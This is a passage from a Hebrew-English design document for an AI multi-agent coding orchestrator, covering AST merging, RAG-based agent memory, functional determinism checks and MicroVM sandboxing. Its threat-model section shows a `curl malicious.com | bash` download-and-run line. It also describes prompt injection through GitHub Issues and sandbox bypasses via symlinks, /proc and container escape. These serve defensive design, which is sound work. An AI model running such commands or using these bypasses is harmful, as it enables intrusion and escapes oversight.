        conflicts.push({
          level: 'low',
          type: 'concurrent_additions',
          parentPath: parentOf(a.path),
          changeA: a,
          changeB: b
        });
      }
    }
  }

  return conflicts;
}
```

**Integration: Wave assignment with conflict prevention**

```javascript
// In kadima-engine.mjs — before wave execution

async function executeWaveWithMerge(root, wave, featureSlug) {
  // Step 1: Optimize — split wave if file conflicts detected
  const optimizedWaves = optimizeWaveAssignment(root, { waves: [wave] });

  for (const subWave of optimizedWaves) {
    // Step 2: Acquire semantic locks for each task
    for (const task of subWave.tasks) {
      for (const file of task.touches || []) {
        const lock = acquireLock(root, {
          file,
          region: task.touchRegion?.[file] || null,
          agentId: task.assignedTo,
          taskId: task.id,
          featureSlug,
          waveId: subWave.id
        });

        if (!lock.granted) {
          // Queue task for next sub-wave
          requeueTask(root, task, 'next_wave');
          continue;
        }
      }
    }

    // Step 3: Execute agents in parallel (each in own worktree)
    const results = await Promise.all(
      subWave.tasks.map(task => executeAgentTask(root, task))
    );

    // Step 4: Merge worktrees using AST merge
    for (const result of results) {
      if (!result.success) continue;

      const mergeResult = await mergeWorktreeAST(root, {
        worktree: result.worktree,
        base: 'main',
        language: detectLanguage(result.modifiedFiles)
      });

      if (mergeResult.strategy === 'escalate') {
        // Architect agent resolves the conflict
        await escalateConflict(root, mergeResult, featureSlug);
      } else if (mergeResult.requiresVerification) {
        // Auto-merged but needs compile gate
        await runCompileGate(root, featureSlug);
      }
    }

    // Step 5: Release all semantic locks
    releaseAllWaveLocks(root, subWave.id);
  }
}
```

**CLI Commands:**

```
ogu merge:preview <slug>                       ← Preview merge conflicts for next wave
ogu merge:ast <file> --base <ref> --a <ref> --b <ref>  ← AST merge between branches
ogu merge:conflicts                            ← Show current semantic lock conflicts
ogu locks:show                                 ← Show active semantic locks
ogu locks:release <lockId>                     ← Force-release a semantic lock
ogu wave:optimize <slug>                       ← Re-optimize wave ordering by file overlap
```

**Example:**
```
$ ogu merge:preview auth-system
MERGE PREVIEW: auth-system (wave-2, 3 agents)

  FILE                          AGENTS          OVERLAP    STRATEGY
  ─────────────────────────── ────────────── ─────────── ──────────────────
  src/models/users.ts          backend, frontend  YES       split to sub-waves
    backend: adds field 'role'     (class UserModel, line 22)
    frontend: adds method 'toDTO'  (class UserModel, line 45)
    OVERLAP: same class, different regions → AST merge possible

  src/middleware/auth.ts        backend          none       parallel OK
  src/components/LoginForm.tsx  frontend         none       parallel OK
  tests/auth.test.ts           backend, qa      YES        low conflict
    backend: adds unit test        (new describe block)
    qa: adds e2e test              (new describe block)
    OVERLAP: both add to same file → union (no conflict)

  RECOMMENDATION:
    Option A: Run all 3 agents, AST merge after (risk: medium)
    Option B: Split backend/frontend to sub-waves (risk: none, +1 wave)
    ✓ Selected: Option B (safe — no merge conflicts possible)

$ ogu merge:ast src/models/users.ts --base main --a worktree/backend --b worktree/frontend
AST MERGE: src/models/users.ts

  BASE: 89 lines, 4 AST nodes (class, 2 methods, 1 export)

  BRANCH A (backend):
    + field 'role: UserRole' at class UserModel (line 22)
    ~ method 'validate()' modified (line 34-38)

  BRANCH B (frontend):
    + method 'toDTO(): UserDTO' at class UserModel (line 45-52)
    + import { UserDTO } from './types'

  CONFLICTS: 0
  STRATEGY: auto_merge (additions to different class regions + new import)

  MERGED: 98 lines, 6 AST nodes
  ✓ TypeScript compilation: PASS
  ✓ No semantic conflicts detected
```

**כלל ברזל:** Kadima NEVER assigns two agents to the same file in the same wave without checking overlap. AST merge replaces git merge for all supported languages. High conflicts escalate to architect. Low conflicts auto-merge + compile gate. Unsupported languages fallback to git merge.

---

### Closure 10: Semantic Memory Fabric — The Corporate Brain

**הבעיה:** בעוד 5 שנים, הפרויקט יכיל 10,000 קבצים, מאות ADRs, אלפי bugs שתוקנו. אי אפשר לדחוף את כל ההיסטוריה ל-context window של כל סוכן. סוכנים יתחילו:
1. "להמציא את הגלגל מחדש" — לכתוב קוד שכבר נכתב
2. לשבור Invariants ישנים — כי לא קראו ADR מלפני שנתיים
3. לחזור על טעויות ישנות — כי לא ראו את ה-post-mortem

"שכחת תאגיד" היא הסיבה #1 לכשל של מערכות AI ארוכות-טווח.

**קבצים חדשים:**

```
.ogu/knowledge/                                ← Knowledge graph storage
.ogu/knowledge/embeddings.idx                  ← Vector index (HNSW)
.ogu/knowledge/graph.json                      ← Entity-relationship graph
.ogu/knowledge/contracts.embeddings            ← Contract embeddings
.ogu/knowledge/decisions.embeddings            ← ADR embeddings
.ogu/knowledge/failures.embeddings             ← Failure/postmortem embeddings
tools/ogu/commands/lib/memory-fabric.mjs       ← Knowledge graph + RAG engine
tools/ogu/commands/knowledge.mjs               ← CLI: knowledge:index, knowledge:query, knowledge:inject
docs/vault/02_Contracts/Memory.contract.md     ← Memory system contract
```

**Schema: Knowledge Entity**

```json
{
  "$schema": "KnowledgeEntity/1.0",

  "entity": {
    "id": "ke-sha256-short",
    "type": "contract | adr | invariant | postmortem | pattern | failure | decision | file_summary",
    "source": {
      "file": "docs/vault/01_Architecture/ADR-005-auth-strategy.md",
      "hash": "sha256:...",
      "lastIndexed": "ISO"
    },
    "content": "Original text (truncated for embedding)",
    "embedding": "[768-dim float vector]",
    "metadata": {
      "created": "ISO",
      "author": "architect",
      "relatedFiles": ["src/middleware/auth.ts", "src/models/users.ts"],
      "relatedEntities": ["ke-contract-auth", "ke-adr-003"],
      "tags": ["auth", "security", "jwt"],
      "importance": "high | medium | low",
      "staleness": "fresh | aging | stale"
    },
    "relationships": [
      { "type": "supersedes", "target": "ke-adr-003", "reason": "Updated auth strategy" },
      { "type": "constrains", "target": "src/middleware/auth.ts", "reason": "Invariant: all routes must validate JWT" },
      { "type": "caused_by_failure", "target": "ke-failure-042", "reason": "XSS via unsanitized token" }
    ]
  }
}
```

**Schema: RAG Context Injection (addition to InputEnvelope)**

```json
{
  "inputEnvelope": {
    "...existing fields...": "...",

    "relevantHistory": {
      "description": "Auto-injected by Kadima via RAG before sending to Ogu. Agent receives this as 'corporate memory'.",

      "contracts": [
        {
          "source": "docs/vault/02_Contracts/Auth.contract.md",
          "relevance": 0.94,
          "summary": "All auth endpoints must validate JWT. Session tokens expire after 1h. Refresh tokens after 7d.",
          "keyInvariants": ["JWT validation mandatory", "No plaintext tokens in logs"]
        }
      ],
      "decisions": [
        {
          "source": "docs/vault/01_Architecture/ADR-005-auth-strategy.md",
          "relevance": 0.91,
          "summary": "Chose JWT over session cookies. Reason: stateless, works with API clients. Supersedes ADR-003.",
          "impact": "All auth code must be stateless. No server-side session store."
        }
      ],
      "failures": [
        {
          "source": ".ogu/knowledge/failures/failure-042.json",
          "relevance": 0.87,
          "summary": "XSS via unsanitized JWT payload displayed in admin panel. Fixed in commit abc123.",
          "lesson": "ALWAYS sanitize token contents before rendering. Never trust decoded JWT values."
        }
      ],
      "patterns": [
        {
          "source": "~/.ogu/global-memory/patterns/auth-middleware-pattern.md",
          "relevance": 0.82,
          "summary": "Standard auth middleware pattern: validate → decode → attach to req → next().",
          "codeSnippet": "export const authMiddleware = (req, res, next) => { ... }"
        }
      ],
      "similarCode": [
        {
          "file": "src/middleware/auth.ts",
          "relevance": 0.95,
          "summary": "Existing auth middleware. Agent should extend, not rewrite.",
          "keyFunctions": ["validateToken()", "refreshToken()", "revokeToken()"]
        }
      ],

      "injectionMetadata": {
        "queryVector": "Computed from task description + file touches",
        "topK": 10,
        "minRelevance": 0.75,
        "totalCandidates": 847,
        "injectedAt": "ISO",
        "estimatedTokens": 2400
      }
    }
  }
}
```

**Pseudo-code: memory-fabric.mjs**

```javascript
// tools/ogu/commands/lib/memory-fabric.mjs

import { readFileSync, readdirSync, writeFileSync } from 'fs';
import { join } from 'path';
import { createHash } from 'crypto';
import { audit } from './audit.mjs';

const KNOWLEDGE_DIR = '.ogu/knowledge';
const EMBEDDINGS_DIR = '.ogu/knowledge/embeddings';

/**
 * Index all knowledge sources into the graph + vector store.
 * Called on: ogu knowledge:index, post-commit hook, post-compile.
 */
export async function indexKnowledge(root, { modelRouter }) {
  const sources = discoverSources(root);
  const graph = loadGraph(root);
  let indexed = 0;

  for (const source of sources) {
    const currentHash = hashFile(source.path);
    const existingEntity = graph.entities.find(e => e.source.file === source.relativePath);

    // Skip if unchanged
    if (existingEntity && existingEntity.source.hash === currentHash) continue;

    // Generate embedding via model router (uses cheapest capable model)
    const content = readFileSync(source.path, 'utf-8');
    const summary = await generateSummary(modelRouter, content, source.type);
    const embedding = await generateEmbedding(modelRouter, summary);

    const entity = {
      id: `ke-${createHash('sha256').update(source.relativePath).digest('hex').slice(0, 12)}`,
      type: source.type,
      source: {
        file: source.relativePath,
        hash: currentHash,
        lastIndexed: new Date().toISOString()
      },
      content: summary,
      embedding,
      metadata: {
        created: existingEntity?.metadata.created || new Date().toISOString(),
        relatedFiles: extractFileReferences(content),
        tags: extractTags(content, source.type),
        importance: inferImportance(source.type, content),
        staleness: 'fresh'
      },
      relationships: extractRelationships(content, graph)
    };

    // Upsert into graph
    if (existingEntity) {
      Object.assign(existingEntity, entity);
    } else {
      graph.entities.push(entity);
    }

    // Update vector index
    upsertEmbedding(root, entity.id, embedding);
    indexed++;
  }

  // Mark stale entities (source file deleted or significantly changed)
  markStaleEntities(root, graph, sources);

  saveGraph(root, graph);

  audit.emit(root, {
    type: 'knowledge_indexed',
    context: { indexed, total: graph.entities.length, sources: sources.length }
  });

  return { indexed, total: graph.entities.length };
}

/**
 * RAG query: find relevant knowledge for a task context.
 * Called by Kadima before building InputEnvelope.
 */
export async function queryForTask(root, { taskDescription, filesToTouch, featureSlug, modelRouter }) {
  const graph = loadGraph(root);

  // Build query from task context
  const queryText = [
    taskDescription,
    `Files: ${filesToTouch.join(', ')}`,
    `Feature: ${featureSlug}`
  ].join('\n');

  const queryEmbedding = await generateEmbedding(modelRouter, queryText);

  // Vector search — find top-K similar entities
  const candidates = vectorSearch(root, queryEmbedding, { topK: 20, minScore: 0.7 });

  // Enrich with graph relationships
  const enriched = enrichWithGraph(graph, candidates, filesToTouch);

  // Rank by relevance + recency + importance
  const ranked = rankResults(enriched);

  // Select top results within token budget
  const selected = selectWithinBudget(ranked, { maxTokens: 3000 });

  // Format for InputEnvelope injection
  return {
    contracts: selected.filter(s => s.type === 'contract').map(formatContract),
    decisions: selected.filter(s => s.type === 'adr' || s.type === 'decision').map(formatDecision),
    failures: selected.filter(s => s.type === 'failure' || s.type === 'postmortem').map(formatFailure),
    patterns: selected.filter(s => s.type === 'pattern').map(formatPattern),
    similarCode: selected.filter(s => s.type === 'file_summary').map(formatCode),
    injectionMetadata: {
      queryVector: 'computed',
      topK: selected.length,
      minRelevance: selected.length > 0 ? selected[selected.length - 1].score : 0,
      totalCandidates: candidates.length,
      injectedAt: new Date().toISOString(),
      estimatedTokens: estimateTokens(selected)
    }
  };
}

/**
 * Discover all indexable sources in the project
 */
function discoverSources(root) {
  const sources = [];

  // Contracts
  const contractsDir = join(root, 'docs/vault/02_Contracts');
  if (existsSync(contractsDir)) {
    for (const file of globSync(join(contractsDir, '**/*.md'))) {
      sources.push({ path: file, relativePath: relative(root, file), type: 'contract' });
    }
  }

  // ADRs
  const adrDir = join(root, 'docs/vault/01_Architecture');
  if (existsSync(adrDir)) {
    for (const file of globSync(join(adrDir, '**/ADR-*.md'))) {
      sources.push({ path: file, relativePath: relative(root, file), type: 'adr' });
    }
  }

  // Invariants (from Spec.md files)
  const featuresDir = join(root, 'docs/vault/04_Features');
  if (existsSync(featuresDir)) {
    for (const file of globSync(join(featuresDir, '**/Spec.md'))) {
      sources.push({ path: file, relativePath: relative(root, file), type: 'invariant' });
    }
  }

  // Failure postmortems (from audit)
  const failuresDir = join(root, '.ogu/knowledge/failures');
  if (existsSync(failuresDir)) {
    for (const file of globSync(join(failuresDir, '*.json'))) {
      sources.push({ path: file, relativePath: relative(root, file), type: 'failure' });
    }
  }

  // Key source files (summarized, not full content)
  const srcFiles = globSync(join(root, 'src/**/*.{ts,tsx,js,jsx}'));
  for (const file of srcFiles.slice(0, 200)) { // Cap at 200 most important
    sources.push({ path: file, relativePath: relative(root, file), type: 'file_summary' });
  }

  // Global memory patterns
  const globalDir = expandHome('~/.ogu/global-memory/patterns');
  if (existsSync(globalDir)) {
    for (const file of globSync(join(globalDir, '**/*.md'))) {
      sources.push({ path: file, relativePath: relative(root, file), type: 'pattern' });
    }
  }

  return sources;
}

/**
 * Vector similarity search using HNSW index
 */
function vectorSearch(root, queryVector, { topK, minScore }) {
  const index = loadVectorIndex(root);
  const results = index.search(queryVector, topK);
  return results.filter(r => r.score >= minScore);
}

/**
 * Enrich vector results with graph relationships
 * If a contract constrains a file we're touching, boost its relevance
 */
function enrichWithGraph(graph, candidates, filesToTouch) {
  return candidates.map(c => {
    const entity = graph.entities.find(e => e.id === c.id);
    if (!entity) return { ...c, graphBoost: 0 };

    let boost = 0;

    // Boost if entity directly relates to files we're touching
    for (const file of filesToTouch) {
      if (entity.metadata.relatedFiles?.some(rf => file.includes(rf) || rf.includes(file))) {
        boost += 0.15;
      }
    }

    // Boost if entity constrains files we're touching
    for (const rel of entity.relationships || []) {
      if (rel.type === 'constrains' && filesToTouch.some(f => f.includes(rel.target))) {
        boost += 0.20; // High boost — this is a constraint on our target
      }
    }

    // Penalize stale entities
    if (entity.metadata.staleness === 'stale') boost -= 0.10;

    return { ...c, score: Math.min(c.score + boost, 1.0), graphBoost: boost, entity };
  });
}
```

**CLI Commands:**

```
ogu knowledge:index                            ← Index all knowledge sources
ogu knowledge:index --incremental              ← Index only changed files
ogu knowledge:query "how does auth work?"      ← Natural language query against knowledge graph
ogu knowledge:query --files src/auth/*.ts      ← Find relevant knowledge for specific files
ogu knowledge:graph                            ← Show knowledge graph statistics
ogu knowledge:graph --entities <type>          ← List entities by type
ogu knowledge:stale                            ← Show stale/outdated knowledge entities
ogu knowledge:inject --task <id> --feature <slug> ← Preview RAG injection for a task
```

**Example:**
```
$ ogu knowledge:index
KNOWLEDGE INDEX:

  Scanned:   847 sources
  Indexed:   23 new, 5 updated, 0 stale
  Total:     412 entities in graph

  BREAKDOWN:
    contracts:    18 (12 fresh, 4 aging, 2 stale)
    adrs:         34 (28 fresh, 6 aging)
    invariants:   45 (42 fresh, 3 aging)
    failures:     12 (all fresh)
    patterns:     8  (6 fresh, 2 aging)
    file_summaries: 295 (200 fresh, 85 aging, 10 stale)

  GRAPH: 412 entities, 1,847 relationships

$ ogu knowledge:inject --task task-5 --feature auth-system
RAG INJECTION PREVIEW (task-5: auth-system):

  Query: "Add role-based access control to auth middleware"
  Files: src/middleware/auth.ts, src/models/users.ts

  INJECTED (8 items, ~2,400 tokens):

  CONTRACTS (relevance > 0.9):
    ✓ Auth.contract.md (0.94) — JWT validation mandatory, no plaintext tokens
    ✓ Security.contract.md (0.91) — RBAC required for admin routes

  DECISIONS:
    ✓ ADR-005-auth-strategy.md (0.91) — JWT over sessions, stateless
    ✓ ADR-012-rbac-model.md (0.88) — Role hierarchy: admin > editor > viewer

  FAILURES:
    ✓ failure-042 (0.87) — XSS via unsanitized JWT payload (2025-11)

  SIMILAR CODE:
    ✓ src/middleware/auth.ts (0.95) — Existing middleware, extend don't rewrite
    ✓ src/middleware/admin.ts (0.83) — Admin-only middleware pattern

  PATTERNS:
    ✓ rbac-middleware-pattern (0.82) — Standard RBAC check pattern

  → Agent will receive this as context, behaving like a "veteran developer" who knows the codebase history.
```

**כלל ברזל:** כל סוכן מקבל relevant corporate memory לפני שהוא מתחיל לעבוד. Memory is indexed on commit. RAG injection is automatic — Kadima does it, not the agent. Stale knowledge is penalized, not deleted. Knowledge graph relationships boost relevance for files the agent is about to touch.

---

### Closure 11: Functional Determinism Tolerance

**הבעיה:** Enhancement 5 (Deterministic Mode) מקפיא model version. אבל בעולם האמיתי:
1. ספקיות AI עושות **quantization חרישי** — אותו model version, תוצאות שונות
2. Temperature, top_p, ו-sampling **inherently non-deterministic** — אפילו עם seed
3. ה-Execution Hash יישבר → המערכת תעצור → downtime על שום דבר

דטרמיניזם **טקסטואלי** (SHA256 של output string) הוא אשליה. המערכת צריכה דטרמיניזם **פונקציונלי**: קוד שמתנהג אותו הדבר = equivalent, גם אם הטקסט שונה.

**קובץ חדש:** `docs/vault/02_Contracts/FunctionalDeterminism.contract.md`

**Schema: Functional Equivalence Check**

```json
{
  "$schema": "FunctionalDeterminism/1.0",

  "principle": "Two code outputs are 'equivalent' if they produce the same AST structure (ignoring cosmetic differences) AND pass the same gates.",

  "equivalenceLevels": [
    {
      "level": "L0-identical",
      "description": "Byte-for-byte identical output",
      "detection": "SHA256 of raw text matches",
      "action": "Accept. Perfect determinism.",
      "auditEvent": "none"
    },
    {
      "level": "L1-cosmetic",
      "description": "Different whitespace, formatting, variable names, comments",
      "detection": "Raw SHA256 differs, but AST hash matches",
      "action": "Accept. Log SilentDriftCompensated. Update snapshot hash.",
      "auditEvent": "drift_cosmetic",
      "examples": ["renamed 'foo' to 'bar'", "added blank line", "reformatted with prettier"]
    },
    {
      "level": "L2-structural-safe",
      "description": "AST differs but code is functionally equivalent (different implementation, same behavior)",
      "detection": "AST hash differs, but ALL gates pass (compile, test, type-check, lint)",
      "action": "Accept with caution. Log DriftAccepted. Require human confirmation for critical features.",
      "auditEvent": "drift_structural_safe",
      "examples": ["for loop replaced with .map()", "if/else replaced with ternary", "function reordered"]
    },
    {
      "level": "L3-structural-unsafe",
      "description": "AST differs and some gates fail",
      "detection": "AST hash differs AND at least one gate fails",
      "action": "REJECT. Log DriftRejected. Re-execute with different model or escalate.",
      "auditEvent": "drift_structural_unsafe"
    },
    {
      "level": "L4-behavioral",
      "description": "Code compiles but produces different runtime behavior",
      "detection": "Tests pass differently (new failures or different output values)",
      "action": "REJECT. Log DriftBehavioral. Investigate model degradation.",
      "auditEvent": "drift_behavioral"
    }
  ],

  "astHashAlgorithm": {
    "description": "How to compute a determinism-safe hash from code",
    "steps": [
      "1. Parse code into AST using language-specific parser",
      "2. Normalize: remove comments, standardize whitespace, sort imports",
      "3. Canonicalize variable names to positional identifiers (var_1, var_2, ...)",
      "4. Serialize normalized AST to canonical JSON",
      "5. SHA256 the canonical JSON → this is the 'functional hash'"
    ],
    "invariant": "If two code snippets have the same functional hash, they are guaranteed to be semantically equivalent (within the limits of the AST parser)."
  },

  "autoHealingPipeline": {
    "description": "When silent drift is detected, the system auto-heals instead of halting.",
    "steps": [
      "1. Detect: raw hash differs from snapshot",
      "2. Classify: compute AST hash. If AST matches → L1 (cosmetic). If not → continue.",
      "3. Gate-check: run all 14 gates on the new output. If all pass → L2 (safe). If not → L3/L4 (reject).",
      "4. Accept or reject based on level.",
      "5. If accepted: update snapshot hash to new value. Log compensation event.",
      "6. If rejected: re-execute task with (a) different model version, (b) different provider, (c) architect escalation."
    ]
  }
}
```

**Pseudo-code: functional-determinism.mjs**

```javascript
// tools/ogu/commands/lib/functional-determinism.mjs

import { createHash } from 'crypto';
import { audit } from './audit.mjs';

/**
 * Compare two code outputs for functional equivalence.
 * Returns equivalence level (L0-L4) and whether to accept.
 */
export function checkEquivalence(root, { expected, actual, language, featureSlug, taskId }) {
  // L0: Identical
  const rawHashExpected = sha256(expected);
  const rawHashActual = sha256(actual);

  if (rawHashExpected === rawHashActual) {
    return { level: 'L0-identical', accept: true, hashUpdate: false };
  }

  // L1: Cosmetic (same AST)
  const astHashExpected = computeASTHash(expected, language);
  const astHashActual = computeASTHash(actual, language);

  if (astHashExpected === astHashActual) {
    audit.emit(root, {
      type: 'drift_cosmetic',
      context: {
        taskId, featureSlug,
        rawBefore: rawHashExpected,
        rawAfter: rawHashActual,
        astHash: astHashExpected,
        level: 'L1-cosmetic'
      }
    });

    return {
      level: 'L1-cosmetic',
      accept: true,
      hashUpdate: true,
      newHash: rawHashActual,
      reason: 'AST identical, cosmetic differences only'
    };
  }

  // L2/L3: AST differs — need gate check
  return {
    level: 'pending-gate-check',
    accept: null, // determined after gates
    astDiff: {
      expected: astHashExpected,
      actual: astHashActual
    },
    requiresGateCheck: true
  };
}

/**
 * After gate check, classify as L2 (safe) or L3/L4 (unsafe)
 */
export function classifyAfterGates(root, { taskId, featureSlug, gateResults, pendingCheck }) {
  const allPassed = gateResults.every(g => g.passed);

  if (allPassed) {
    // L2: Structural but safe
    audit.emit(root, {
      type: 'drift_structural_safe',
      context: {
        taskId, featureSlug,
        astBefore: pendingCheck.astDiff.expected,
        astAfter: pendingCheck.astDiff.actual,
        gatesPassed: gateResults.length,
        level: 'L2-structural-safe'
      }
    });

    return {
      level: 'L2-structural-safe',
      accept: true,
      hashUpdate: true,
      requiresHumanConfirmation: isHighRiskFeature(root, featureSlug),
      reason: 'AST differs but all gates pass'
    };
  }

  // Some gates failed
  const failedGates = gateResults.filter(g => !g.passed);

  // Check if test results differ (L4) or just compilation issues (L3)
  const hasBehavioralDiff = failedGates.some(g => g.type === 'test' && g.previouslyPassed);

  const level = hasBehavioralDiff ? 'L4-behavioral' : 'L3-structural-unsafe';

  audit.emit(root, {
    type: hasBehavioralDiff ? 'drift_behavioral' : 'drift_structural_unsafe',
    context: {
      taskId, featureSlug,
      failedGates: failedGates.map(g => g.name),
      level
    }
  });

  return {
    level,
    accept: false,
    hashUpdate: false,
    failedGates: failedGates.map(g => g.name),
    recommendation: level === 'L4-behavioral'
      ? 'Investigate model degradation. Try different provider.'
      : 'Re-execute with fixed prompt or escalate to architect.'
  };
}

/**
 * Compute AST hash — the "functional fingerprint" of code.
 * Same logic, different formatting = same hash.
 */
export function computeASTHash(code, language) {
  const parser = getParser(language);
  if (!parser) {
    // Unsupported → fall back to raw hash (no tolerance)
    return sha256(code);
  }

  try {
    const ast = parser.parse(code);

    // Step 1: Remove comments
    removeComments(ast);

    // Step 2: Normalize whitespace
    normalizeWhitespace(ast);

    // Step 3: Sort imports alphabetically
    sortImports(ast);

    // Step 4: Canonicalize variable names
    // (local variables → positional names: _v0, _v1, _v2)
    // (exported names preserved — they're part of the API)
    canonicalizeLocalVars(ast);

    // Step 5: Serialize to canonical JSON
    const canonical = serializeCanonical(ast);

    return sha256(canonical);
  } catch (e) {
    // Parse failure → raw hash
    return sha256(code);
  }
}

/**
 * Auto-healing: when drift detected, try to self-recover.
 */
export async function autoHealDrift(root, { taskId, featureSlug, expected, actual, language }) {
  // Step 1: Check equivalence
  const equiv = checkEquivalence(root, { expected, actual, language, featureSlug, taskId });

  if (equiv.accept === true) {
    // L0 or L1 — auto-heal by updating hash
    if (equiv.hashUpdate) {
      updateSnapshotHash(root, taskId, equiv.newHash);
    }
    return { healed: true, level: equiv.level };
  }

  if (equiv.requiresGateCheck) {
    // Run gates on the new output
    const gateResults = await runAllGates(root, featureSlug);
    const classification = classifyAfterGates(root, {
      taskId, featureSlug, gateResults, pendingCheck: equiv
    });

    if (classification.accept) {
      updateSnapshotHash(root, taskId, sha256(actual));
      return { healed: true, level: classification.level };
    }

    return { healed: false, level: classification.level, recommendation: classification.recommendation };
  }

  return { healed: false, level: 'unknown' };
}

function sha256(content) {
  return createHash('sha256').update(content).digest('hex').slice(0, 16);
}
```

**CLI Commands:**

```
ogu determinism:check <slug>                   ← Check functional determinism for feature
ogu determinism:ast-hash <file>                ← Compute AST hash for a file
ogu determinism:compare <file> <ref1> <ref2>   ← Compare two versions functionally
ogu determinism:drift <slug>                   ← Show drift events and healing history
ogu determinism:heal <taskId>                  ← Attempt auto-heal on detected drift
```

**Example:**
```
$ ogu determinism:check auth-system
DETERMINISM CHECK: auth-system

  TASK    FILE                         RAW HASH    AST HASH    LEVEL           STATUS
  ─────  ──────────────────────────── ─────────── ─────────── ─────────────── ──────────
  task-1  src/middleware/auth.ts       a1b2c3d4    f5e6d7c8    L0-identical    ✓ match
  task-2  src/models/users.ts         e9f0a1b2    c3d4e5f6    L0-identical    ✓ match
  task-3  src/routes/auth.ts          1234abcd    5678efgh    L1-cosmetic     ✓ healed
    └─ Drift: variable rename (token → authToken). AST identical. Hash updated.
  task-4  tests/auth.test.ts          aaaabbbb    ccccdddd    L0-identical    ✓ match

  SUMMARY: 4/4 deterministic (1 cosmetic drift, auto-healed)
  DRIFT EVENTS: 1 (all compensated)

$ ogu determinism:compare src/routes/auth.ts HEAD~1 HEAD
FUNCTIONAL COMPARISON: src/routes/auth.ts

  VERSION A (HEAD~1):                VERSION B (HEAD):
  ────────────────────              ─────────────────────
  const token = req.header(...)     const authToken = req.header(...)
  if (!token) return 401            if (!authToken) return 401
  const decoded = verify(token)     const decoded = verify(authToken)

  RAW HASH:  a1b2c3d4 → e5f6g7h8 (DIFFERENT)
  AST HASH:  f9f9f9f9 → f9f9f9f9 (IDENTICAL)

  EQUIVALENCE: L1-cosmetic
  VERDICT: Functionally identical. Variable rename only.
```

**כלל ברזל:** דטרמיניזם = פונקציונלי, לא טקסטואלי. AST hash הוא הסטנדרט. L0/L1 = auto-accept. L2 = accept + gate check. L3/L4 = reject + re-execute. המערכת לעולם לא עוצרת בגלל variable rename. המערכת תמיד עוצרת בגלל behavioral change.

---

### Closure 12: MicroVM Execution Matrix

**הבעיה:** סוכנים עם גישה ל-Bash ול-Write יכולים להיות מטרה ל:
1. **Prompt Injection** — תוקף מכניס payload ל-GitHub Issue שסוכן קורא
2. **Supply Chain Attack** — NPM package עם postinstall script זדוני
3. **RCE (Remote Code Execution)** — סוכן מורעל מריץ `curl malicious.com | bash`

Sandbox Policy (Fix 8) מבוסס על OS-level env filtering ו-path allowlists. זה לא מספיק:
- Container escape = known attack vector
- Shared kernel = shared vulnerabilities
- File-based sandbox = bypassable via symlinks, hardlinks, `/proc`

**קובץ חדש:** `docs/vault/02_Contracts/ExecutionIsolation.contract.md`

**Schema: MicroVM Execution Contract**

```json
{
  "$schema": "ExecutionIsolation/1.0",

  "principle": "Every task execution runs in an ephemeral, hardware-isolated environment. Zero kernel sharing. Zero state persistence. Zero network by default.",

  "isolationLevels": [
    {
      "level": "L0-local-trust",
      "description": "Local execution with OS-level sandbox (current Fix 8)",
      "usedWhen": "Development, trusted code, no external inputs",
      "isolation": "Process-level (env filtering, path restrictions)",
      "networkPolicy": "host network",
      "persistence": "shared filesystem",
      "riskAcceptance": "Agent trusted, code trusted, inputs trusted"
    },
    {
      "level": "L1-container",
      "description": "Docker/OCI container with restricted capabilities",
      "usedWhen": "Production tasks that touch only known-good dependencies",
      "isolation": "Namespace isolation (PID, NET, MNT, USER)",
      "networkPolicy": "egress proxy only",
      "persistence": "copy-in, copy-out (no bind mounts)",
      "riskAcceptance": "Agent trusted, code may be untrusted"
    },
    {
      "level": "L2-microvm",
      "description": "Firecracker/Cloud Hypervisor MicroVM — full hardware isolation",
      "usedWhen": "Tasks with Bash tool, external inputs, or dependency installation",
      "isolation": "Hypervisor-level (separate kernel, separate memory, separate network stack)",
      "networkPolicy": "egress proxy with SSL inspection",
      "persistence": "ephemeral rootfs, artifacts extracted via gRPC",
      "riskAcceptance": "Nothing trusted. Full adversarial model."
    },
    {
      "level": "L3-airgapped",
      "description": "MicroVM with zero network access",
      "usedWhen": "Security-critical tasks (crypto, auth, secrets handling)",
      "isolation": "L2 + no network interface at all",
      "networkPolicy": "no network",
      "persistence": "ephemeral, artifacts signed before extraction",
      "riskAcceptance": "Maximum paranoia. No external communication possible."
    }
  ],

  "riskToLevel": {
    "description": "Automatic isolation level selection based on task risk profile",
    "rules": [
      { "condition": "task.tools includes 'Bash'", "minLevel": "L1-container" },
      { "condition": "task.touches includes 'package.json' OR 'package-lock.json'", "minLevel": "L2-microvm" },
      { "condition": "task.readsExternalInput == true", "minLevel": "L2-microvm" },
      { "condition": "task.installsDependencies == true", "minLevel": "L2-microvm" },
      { "condition": "task.capability == 'security_audit'", "minLevel": "L3-airgapped" },
      { "condition": "task.riskTier == 'critical'", "minLevel": "L2-microvm" },
      { "condition": "task.riskTier == 'low' AND task.tools excludes 'Bash'", "minLevel": "L0-local-trust" }
    ]
  },

  "microVMSpec": {
    "runtime": "Firecracker | Cloud Hypervisor | gVisor",
    "bootTimeMs": 125,
    "maxLifetimeMs": 600000,
    "resources": {
      "vcpus": 2,
      "memoryMb": 1024,
      "diskMb": 2048
    },
    "lifecycle": [
      "1. CREATE: Spin up MicroVM from cached rootfs image (125ms)",
      "2. INJECT: Copy task inputs + code snapshot into VM via virtio-fs",
      "3. EXECUTE: Agent runs inside VM. All Bash/Write calls are VM-local.",
      "4. EXTRACT: Copy output artifacts out via gRPC (validated against expected outputs)",
      "5. VERIFY: Scan extracted artifacts for unexpected files, executables, scripts",
      "6. DESTROY: Physical destruction of VM. Memory zeroed. Disk scrubbed."
    ],
    "postDestroyGuarantees": [
      "No process from the VM survives",
      "No file from the VM persists on host",
      "No network connection from the VM remains",
      "Memory pages returned to host are zeroed"
    ]
  },

  "networkEgressProxy": {
    "description": "All outbound network traffic from L1+ environments passes through Kadima's egress proxy.",
    "capabilities": [
      "SSL/TLS interception (MITM proxy with Kadima CA)",
      "Domain allowlist enforcement",
      "Content-type validation (block executable downloads)",
      "Rate limiting per agent",
      "Full traffic logging for audit"
    ],
    "allowedDomains": {
      "npm": ["registry.npmjs.org", "registry.yarnpkg.com"],
      "github": ["api.github.com", "raw.githubusercontent.com"],
      "model_providers": ["api.anthropic.com", "api.openai.com"],
      "custom": "Defined per OrgSpec"
    },
    "blockedPatterns": [
      "*.exe", "*.sh (from external sources)", "*.dll",
      "Any domain not in allowlist",
      "Any POST to non-model-provider endpoints",
      "Outbound connections on ports other than 443"
    ],
    "auditLevel": "full — every request logged with URL, response size, content hash"
  },

  "artifactExtractionValidation": {
    "description": "Before artifacts leave the MicroVM, they are validated",
    "checks": [
      "File type matches expected (no binaries when expecting .ts)",
      "No executable permissions set",
      "No symlinks pointing outside extraction directory",
      "File size within expected bounds",
      "Content does not contain known malware signatures (ClamAV scan)",
